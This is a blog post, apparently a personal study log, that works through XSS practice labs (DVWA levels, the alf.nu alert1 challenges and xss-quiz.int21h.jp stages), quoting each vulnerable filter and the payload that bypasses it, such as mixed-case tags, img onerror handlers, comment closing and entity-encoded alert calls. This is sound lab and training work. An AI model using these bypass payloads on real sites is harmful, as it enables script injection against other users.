<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="å¯¹æœªæ¥çš„æœ€å¤§æ…·æ…¨ï¼Œå°±æ˜¯æŠŠä¸€åˆ‡éƒ½çŒ®ç»™ç°åœ¨ã€‚">
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        XSS å­¦ä¹  - undefined
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i>  </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/" />
        </div>
        <div class="name">
            <i>Luc1fer</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>ä¸»é¡µ</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>æ ‡ç­¾</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>å­˜æ¡£</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>å…³äº</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>æœç´¢</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xsså¤‡å¿˜"><span class="toc-text">xsså¤‡å¿˜</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA"><span class="toc-text">DVWA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#reflected"><span class="toc-text">reflected</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stored"><span class="toc-text">Stored</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM"><span class="toc-text">DOM</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ä¸‹é¢æ˜¯å¦ä¸€ä¸ª-xss-é¶åœº"><span class="toc-text">ä¸‹é¢æ˜¯å¦ä¸€ä¸ª xss é¶åœº</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Warmup"><span class="toc-text">Warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Adobe"><span class="toc-text">Adobe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSON"><span class="toc-text">JSON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Markdown"><span class="toc-text">Markdown</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-1"><span class="toc-text">DOM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Skandia"><span class="toc-text">Skandia</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Callback"><span class="toc-text">Callback</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#http-xss-quiz-int21h-jp"><span class="toc-text">http://xss-quiz.int21h.jp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-3"><span class="toc-text">Stage 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-4"><span class="toc-text">Stage 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-5"><span class="toc-text">Stage 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-6"><span class="toc-text">Stage 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-7"><span class="toc-text">Stage 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-8"><span class="toc-text">Stage 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-9"><span class="toc-text">Stage 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-10"><span class="toc-text">Stage 10</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#å‚è€ƒé“¾æ¥"><span class="toc-text">å‚è€ƒé“¾æ¥</span></a></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">æœç´¢</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i>  </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        XSS å­¦ä¹ 
    </div>

    <div class="post-meta">
        <span class="attr">å‘å¸ƒäºï¼š<span>2019-12-25 20:56:41</span></span>
        
        <span class="attr">æ ‡ç­¾ï¼š/
        
        <a class="tag" href="/tags/#XSS" title="XSS">XSS</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">è®¿é—®ï¼š<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <h1 id="xsså¤‡å¿˜"><a href="#xsså¤‡å¿˜" class="headerlink" title="xsså¤‡å¿˜"></a>xsså¤‡å¿˜</h1><p>11/1/2019 10:50:21 AM </p>
<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><h3 id="reflected"><a href="#reflected" class="headerlink" title="reflected"></a>reflected</h3><p><strong>low</strong></p>
<pre><code>&lt;script&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>medium</strong></p>
<pre><code>&lt;scRiPt&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>
<pre><code>&lt;?php

header (&quot;X-XSS-Protection: 0&quot;);

// Is there any input?
if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) {
    // Get input
    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );

    // Feedback for end user
    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;
}

?&gt; </code></pre><p>é»‘åå•è¿‡æ»¤ï¼Œé‡‡ç”¨æ­£åˆ™ä¸åŒºåˆ†å¤§å°å†™ï¼ŒåŒå†™ã€å¤§å°å†™æ··æ·†ä¸è¡Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶ä»–çš„äº‹ä»¶æ ‡ç­¾ï¼š</p>
<pre><code>&lt;img src onerror=alert(1);&gt;&gt;</code></pre><p><strong>impossible</strong></p>
<pre><code>&lt;?php 
// Is there any input? 
if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); 
    // Get input 
    $name = htmlspecialchars( $_GET[ &apos;name&apos; ] ); 
    // Feedback for end user 
    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; 
} 
// Generate Anti-CSRF token 
generateSessionToken(); 
?&gt;</code></pre><h2 id="Stored"><a href="#Stored" class="headerlink" title="Stored"></a>Stored</h2><p><strong>low</strong></p>
<p>name å¤„é•¿åº¦é™åˆ¶ï¼Œ Message å¤„å°è¯• <code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
<p><strong>medium</strong></p>
<pre><code>$message = strip_tags( addslashes( $message ) );
$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
$message = htmlspecialchars( $message );

// Sanitize name input
$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );
$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p><code>strip_tages</code> ç§»é™¤å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨ <code>&lt;b&gt;</code> æ ‡ç­¾ã€‚  <code>addslashes</code>  è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦(å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULL)ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ï¼› <code>htmlspecialchars</code> å¯¹å‚æ•°è¿›è¡Œå®ä½“ç¼–ç ï¼Œæ— æ³•å†å¯¹ <code>message</code> è¿›è¡Œ XSS ï¼Œä½†æ˜¯ <code>name</code> å¤„å¯ä»¥é€šè¿‡ä¿®æ”¹é•¿åº¦è¿›è¡Œ xssã€‚</p>
<pre><code>&lt;sc&lt;script&gt;ript&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>
<pre><code>$message = strip_tags( addslashes( $message ) );
$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
$message = htmlspecialchars( $message );

// Sanitize name input
$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );
$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p>ä¼¼æ›¾ç›¸è¯†å‘¢ğŸ˜‹</p>
<pre><code>&lt;img src onerror=alert(1);&gt;</code></pre><p><strong>impossible</strong></p>
<pre><code>&lt;?php 
if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); 
    // Get input 
    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); 
    $name    = trim( $_POST[ &apos;txtName&apos; ] ); 
    // Sanitize message input 
    $message = stripslashes( $message ); 
    $message = mysql_real_escape_string( $message ); 
    $message = htmlspecialchars( $message ); 
    // Sanitize name input 
    $name = stripslashes( $name ); 
    $name = mysql_real_escape_string( $name ); 
    $name = htmlspecialchars( $name ); 
    // Update database 
    $data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; ); 
    $data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR ); 
    $data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR ); 
    $data-&gt;execute(); 
} 
// Generate Anti-CSRF token 
generateSessionToken(); 
?&gt;</code></pre><h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p><strong>low</strong>    </p>
<pre><code>?default=English&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><strong>medium</strong></p>
<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {
    $default = $_GET[&apos;default&apos;];

    # Do not allow script tags
    if (stripos ($default, &quot;&lt;script&quot;) !== false) {
        header (&quot;location: ?default=English&quot;);
        exit;
    }
} </code></pre><p>è¿‡æ»¤äº† <code>&lt;script</code> ,è§‚å¯Ÿé¡µé¢æºç ï¼Œæ‰‹åŠ¨é—­åˆäº‹ä»¶æ ‡ç­¾ <code>&lt;/option&gt;</code> ã€ <code>&lt;/select&gt;</code>ï¼Œç”±äºä»£ç åªæ£€æµ‹ <code>$default</code> ,äºæ˜¯æˆ‘ä»¬åé¢çš„ä»£ç å¯ä»¥é€ƒé€¸ã€‚</p>
<p>payload:</p>
<pre><code>?default=English&gt;1&lt;/option&gt;&lt;/select&gt;&lt;img src onerror=alert(1)&gt;</code></pre><p><strong>high</strong></p>
<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {

    # White list the allowable languages
    switch ($_GET[&apos;default&apos;]) {
        case &quot;French&quot;:
        case &quot;English&quot;:
        case &quot;German&quot;:
        case &quot;Spanish&quot;:
            # ok
            break;
        default:
            header (&quot;location: ?default=English&quot;);
            exit;
    }
}</code></pre><p>URL ä¸­æ‰€æœ‰åœ¨ # ä¹‹åçš„éƒ½ä¼šè¢«åˆ†å‰²ï¼Œä¸ä¼šå‘é€åˆ°æœåŠ¡ç«¯ï¼Œå› æ­¤ä¸ä¼šè¢«è¿‡æ»¤ï¼Œæ¶æ„ä»£ç ä¼šåœ¨åˆ›å»ºé¡µé¢æ—¶è¢«ç”¨æ¥æ¸²æŸ“<br>è¯»å–é¡µé¢å†…å®¹ã€‚</p>
<p>payload:</p>
<pre><code>?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>æµè§ˆå™¨å¦‚ä½•æ¸²æŸ“ä¸€ä¸ªé¡µé¢ï¼Œæ‰¾åˆ°ä¸€ç¯‡å›½å¤–çš„æ–‡ç« ï¼š<a href="https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969" target="_blank" rel="noopener">https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969</a></p>
<p>HTMLäº‹ä»¶å±æ€§ï¼š<a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p>
<h1 id="ä¸‹é¢æ˜¯å¦ä¸€ä¸ª-xss-é¶åœº"><a href="#ä¸‹é¢æ˜¯å¦ä¸€ä¸ª-xss-é¶åœº" class="headerlink" title="ä¸‹é¢æ˜¯å¦ä¸€ä¸ª xss é¶åœº"></a>ä¸‹é¢æ˜¯å¦ä¸€ä¸ª xss é¶åœº</h1><p>é¶åœºåœ°å€ï¼š<a href="https://alf.nu/alert1" target="_blank" rel="noopener">https://alf.nu/alert1</a></p>
<h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><pre><code>function escape(s) {
  return &apos;&lt;script&gt;console.log(&quot;&apos;+s+&apos;&quot;);&lt;/script&gt;&apos;;
}</code></pre><p>å¯¹è¾“å…¥çš„å€¼æ²¡æœ‰è¿‡æ»¤ç›´æ¥æ‹¼æ¥åˆ°å­—ç¬¦ä¸²ä¸­ï¼Œé—­åˆå‰é¢çš„æ ‡ç­¾å³å¯</p>
<pre><code>1&quot;);alert(1)//    &lt;script&gt;console.log(&quot;1&quot;);alert(1)//&quot;);&lt;/script&gt;
1&quot;);alert(1,&quot;     &lt;script&gt;console.log(&quot;1&quot;);alert(1,&quot;&quot;);&lt;/script&gt;</code></pre><h2 id="Adobe"><a href="#Adobe" class="headerlink" title="Adobe"></a>Adobe</h2><pre><code>function escape(s) {
  s = s.replace(/&quot;/g, &apos;\\&quot;&apos;);
  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;;
}</code></pre><p>å¯¹è¾“å…¥çš„ <code>&quot;</code> åŠ äº†ä¸€ä¸ªè½¬ä¹‰ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é—­åˆ <code>&lt;script&gt;</code> æ ‡ç­¾ï¼Œæˆ–è€…ç”¨ <code>\</code> å†æ¬¡è½¬ä¹‰</p>
<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//        &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1)//&quot;);&lt;/script&gt;

&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;     &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;);&lt;/script&gt;

\&quot;);alert(1)//                     &lt;script&gt;console.log(&quot;\\&quot;);alert(1)//&quot;);&lt;/script&gt;</code></pre><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><pre><code>function escape(s) {
  s = JSON.stringify(s);
  return &apos;&lt;script&gt;console.log(&apos; + s + &apos;);&lt;/script&gt;&apos;;
}</code></pre><p>ä¸ç¬¬äºŒé¢˜ä¸€æ ·</p>
<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//</code></pre><h3 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h3><pre><code>function escape(s) {
  var text = s.replace(/&lt;/g, &apos;&amp;lt;&apos;).replace(/&quot;/g, &apos;&amp;quot;&apos;);
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, &apos;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&apos;);
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, &apos;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&apos;);
  return text;
}</code></pre><p>ç¬¬ä¸€è¡Œè¿‡æ»¤å°†æ‰€æœ‰ <code>&lt; &quot;</code> è¿›è¡Œå®ä½“ç¼–ç </p>
<p>ç¬¬äºŒè¡Œå°†æ‰€æœ‰ <code>http://S+</code> æ›¿æ¢ä¸º <code>&lt;a href=&quot;https://S+&quot;&gt;htp://S+&lt;/a&gt;</code> ,è¿™é‡Œ S+ ä¸ºåŒ¹é…ä¸€ä¸ªéç©ºç™½å­—ç¬¦ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚</p>
<p>ç¬¬ä¸‰è¡Œå°† <code>[[a|b]]</code> æ›¿æ¢ä¸º <code>&lt;img alt=&quot;b&quot; src=&quot;a.gif&quot;&gt;</code></p>
<p>payload: <code>[[a|http://onerror=alert(1)//]]</code></p>
<p>è¾“å‡ºï¼š</p>
<pre><code>&lt;img alt=&quot;&lt;a href=&quot;http://onerror=alert(1)//&quot; src=&quot;a.gif&quot;&gt;&quot;&gt;http://onerror=alert(1)//]]&lt;/a&gt;</code></pre><p>é€šè¿‡ <code>http://onerror=alert(1)//</code> å¼•å…¥ <code>alt=&quot;***&quot;</code> ,æ­¤æ—¶å¼•å·å†…çš„å†…å®¹è§¦å‘ç¬¬äºŒè¡Œçš„æ£€æµ‹ æ›¿æ¢ä¸º<code>&lt;a href=&quot;http://onerror=alert(1)//&quot;&gt;http://onerror=alert(1)//&lt;/a&gt;</code> æ­¤æ—¶ <code>href</code> å¸¦æ¥çš„ <code>&quot;</code> å°† <code>alt</code> çš„å¼•å·é—­åˆï¼ŒåŒæ—¶ <code>//</code> å°†åé¢çš„ä»£ç æ³¨é‡Šæ‰ï¼Œé€ æˆ <code>http://onerror=alert(1)</code> é€ƒé€¸å‡ºæ¥ã€‚</p>
<h3 id="DOM-1"><a href="#DOM-1" class="headerlink" title="DOM"></a>DOM</h3><pre><code>function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like &quot;TextNode#foo&quot;
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement(&apos;div&apos;);
  a.appendChild(document[&apos;create&apos;+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}</code></pre><p>é€šè¿‡ <code>split</code> å¯¹ä¼ å…¥çš„ s è¿›è¡Œåˆ†å‰²<br>    var s=â€creat#fooâ€; var m=s.split(/#/); m<br>    Array [ â€œcreatâ€, â€œfooâ€ ]</p>
<pre><code>document[&apos;create&apos;+m[0]].apply(document, m.slice(1)) </code></pre><p>ç›¸å½“äºè°ƒç”¨äº† document.creatXXX() ,è¿™é‡Œæœ‰å‡ ä¸ªå¸¸ç”¨çš„åˆ›å»º DOM èŠ‚ç‚¹æ–¹æ³•</p>
<pre><code>createElement() åˆ›å»ºä¸€ä¸ªå…ƒç´ èŠ‚ç‚¹
createTextNode() åˆ›å»ºä¸€ä¸ªæ–‡æœ¬èŠ‚ç‚¹
createAttribute() åˆ›å»ºä¸€ä¸ªå±æ€§èŠ‚ç‚¹
createComment() åˆ›å»ºä¸€ä¸ªæ³¨é‡ŠèŠ‚ç‚¹</code></pre><p>æµ‹è¯•æœ€åä¸€ä¸ªï¼š</p>
<pre><code>document.createComment(11111);
&lt;!-- 11111 --&gt;</code></pre><p>Payload: é—­åˆæ³¨é‡Š</p>
<pre><code>Comment#&gt;&lt;iframe onload=alert(1)            &lt;!--&gt;&lt;iframe onload=alert(1)--&gt;</code></pre><h2 id="Skandia"><a href="#Skandia" class="headerlink" title="Skandia"></a>Skandia</h2><pre><code>function escape(s) {
  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;
}</code></pre><p>å¯¹è¾“å…¥çš„ s å…¨éƒ¨å˜æˆå¤§å†™ï¼Œç›´æ¥è¾“å…¥ <code>alert</code> å˜æˆ <code>ALERT</code> ä¹‹åæ— æ³•æ‰§è¡Œã€‚</p>
<p>åˆ©ç”¨ HTML ç¼–ç ç»•è¿‡</p>
<pre><code>&lt;/script&gt;&lt;img src onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</code></pre><p>å…³äºæµè§ˆå™¨å¦‚ä½•å¤„ç†ç¼–ç ï¼Œè´´ä¸€ç¯‡å¤§ä½¬åšå®¢ï¼š<a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a></p>
<h2 id="Callback"><a href="#Callback" class="headerlink" title="Callback"></a>Callback</h2><h1 id="http-xss-quiz-int21h-jp"><a href="#http-xss-quiz-int21h-jp" class="headerlink" title="http://xss-quiz.int21h.jp"></a><a href="http://xss-quiz.int21h.jp" target="_blank" rel="noopener">http://xss-quiz.int21h.jp</a></h1><h2 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage 3"></a>Stage 3</h2><p>å…ˆå°è¯• <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code></p>
<p>æŸ¥çœ‹æºç å‘ç°è¢«è½¬ä¹‰æˆ</p>
<pre><code>aaa&amp;lt;bbb&amp;gt;ccc/ddd&amp;#039;eee&amp;quot;fff;ggg:hhh</code></pre><p>çœ‹èµ·æ¥æ— æ³•æˆåŠŸäº†ï¼Œä½†æ˜¯æ—è¾¹è¿˜æœ‰ä¸ªä¸‹æ‹‰æ ï¼Œæˆ‘ä»¬æŠ“åŒ…è¯•è¯•ä¿®æ”¹ç¬¬äºŒä¸ªå‚æ•°ï¼š</p>
<pre><code>p1=Lodan&amp;p2=&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>It works! è¿™ä¸€å…³åªæ˜¯é˜²å¾¡äº†ç¬¬ä¸€ä¸ªæ ä½ï¼Œä»¥åè¦å¤šç•™å¿ƒç±»ä¼¼çš„ã€‚</p>
<h2 id="Stage-4"><a href="#Stage-4" class="headerlink" title="Stage 4"></a>Stage 4</h2><p>çœ‹èµ·æ¥å’Œç¬¬ä¸‰å…³ä¸€æ ·ï¼Œä»ç„¶æ˜¯å…ˆæµ‹è¯•ï¼Œå‘ç°è¢«è½¬ä¹‰ï¼ŒæŠ“åŒ…å‘ç°å¤šäº†ä¸€ä¸ªå‚æ•° p3 ï¼Œé¦–å…ˆå¯¹æ–°å‚æ•°è¿›è¡Œæµ‹è¯•ï¼Œä¿®æ”¹æˆ <code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code> å‘åŒ…å‘ç°è¿˜æ˜¯å¤±è´¥ï¼ŒæŸ¥çœ‹æºç ä¹‹åä¸ç¬¬äºŒå…³ä¸€æ ·é—­åˆ <code>&quot;&gt;</code> å³å¯ã€‚</p>
<h2 id="Stage-5"><a href="#Stage-5" class="headerlink" title="Stage 5"></a>Stage 5</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> </p>
<p>å‘ç°åªæ˜¾ç¤ºäº†ä¸€æ®µï¼Œ<code>F12</code> ï¼Œä¿®æ”¹é•¿åº¦å†æµ‹</p>
<p>æ²¡æœ‰è¿‡æ»¤ã€‚</p>
<p>å¥½äº†ï¼Œä¿®æ”¹é•¿åº¦ï¼Œç›´æ¥æ’å…¥å§ï¼ </p>
<p>è¯•å®Œæ²¡æˆåŠŸï¼Œå†çœ‹çœ‹æºç ï¼ŒåŸæ¥æ˜¯æ²¡é—­åˆ <code>value</code> ï¼Œæ‰‹åŠ¨é—­åˆæäº¤ï¼š</p>
<p>stage5 çš„ä½œç”¨åªæ˜¯æƒ³å‘Šè¯‰æˆ‘ä»¬ <strong>å®¢æˆ·ç«¯çš„é˜²æŠ¤æ˜¯æ— æ•ˆçš„</strong></p>
<h2 id="Stage-6"><a href="#Stage-6" class="headerlink" title="Stage 6"></a>Stage 6</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , <code>&lt; &gt;</code>è¢«è½¬ä¹‰ï¼Œè€Œä¸”æ²¡æœ‰å…¶ä»–çš„æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æ ä½ï¼Œè¿™æ€ä¹ˆæï¼Ÿ</p>
<p>ç­”æ¡ˆæ˜¯ç”¨ html è¯­æ³•ï¼ŒXSSä¸æ˜¯åªèƒ½æ’å…¥ JS ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ HTML è¯­æ³•ï¼Œä¸ç”¨ <code>&lt;&gt;/</code> åˆ©ç”¨äº‹ä»¶è§¦å‘</p>
<pre><code>&quot; onclick=alert(document.domain); &quot;</code></pre><h2 id="Stage-7"><a href="#Stage-7" class="headerlink" title="Stage 7"></a>Stage 7</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> ,è¿™æ¬¡è¿ <code>&quot;</code> éƒ½è½¬ç§»äº†</p>
<p>è¿˜æ˜¯ä½¿ç”¨ html è¯­æ³•ï¼Œä½¿ç”¨ç©ºæ ¼åˆ†å‰²å±æ€§ï¼ŒåŠ å…¥ä¸€ä¸ª <code>&quot;</code> æ¥ç»“æŸå‰é¢çš„è¯­å¥</p>
<h2 id="Stage-8"><a href="#Stage-8" class="headerlink" title="Stage 8"></a>Stage 8</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , è¿™æ¬¡æ˜¯å°†è¾“å…¥æ’å…¥åˆ°è¶…é“¾æ¥é‡Œï¼Œæˆ‘ä»¬ç›´æ¥æ’å…¥</p>
<pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>è¡Œä¸é€šï¼Œå› ä¸ºæˆ‘ä»¬ç‚¹é“¾æ¥å‘ç°æ˜¯ <code>404</code> ï¼Œæ¢æˆ <code>JavaScript</code> è¯•è¯•</p>
<pre><code>javascript:alert(document.domain);</code></pre><p>æ’å…¥åç‚¹å‡»é“¾æ¥ï¼š</p>
<h2 id="Stage-9"><a href="#Stage-9" class="headerlink" title="Stage 9"></a>Stage 9</h2><p>ä¸æ”¯æŒ UTF-7 ç¼–ç ï¼Œæ‰€ä»¥è·³è¿‡</p>
<h2 id="Stage-10"><a href="#Stage-10" class="headerlink" title="Stage 10"></a>Stage 10</h2><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><blockquote>
<p><a href="https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html" target="_blank" rel="noopener">https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html</a></p>
